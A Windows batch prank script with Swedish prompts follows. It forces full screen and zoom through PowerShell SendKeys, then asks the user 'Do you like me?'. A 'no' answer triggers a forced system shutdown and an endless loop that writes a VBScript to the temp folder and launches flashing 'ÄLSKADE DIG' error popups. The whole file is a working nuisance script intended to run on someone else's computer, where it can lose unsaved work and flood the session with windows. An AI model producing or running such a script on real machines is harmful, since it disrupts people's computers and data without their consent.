


@echo off
:: Run PowerShell to simulate F11 key press
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{F11}')"

color 9

powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"
powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{+}')"

cls

:ask
echo Gillar du mig? (J=ja,N=Nej)
choice /c JN /m "Svara: "

:: Check response
if errorlevel 2 goto SvarNej
if errorlevel 1 goto SvarJa

:SvarJa
echo Du kan dra nu :)
msg * Han gillar mig :) >nul
pause
exit

:SvarNej
color 4
cls
Echo Men jag älskade dig :(
timeout /t 1 >nul
shutdown /s
timeout /t 1 >nul

:loop
Color 07
color 40
color 07
color 40
@echo off
echo Set objShell = CreateObject("WScript.Shell") > %temp%\popup.vbs
echo objShell.Popup "ÄLSKADE DIG", 10, "ERROR", 64 >> %temp%\popup.vbs
start %temp%\popup.vbs
goto loop

 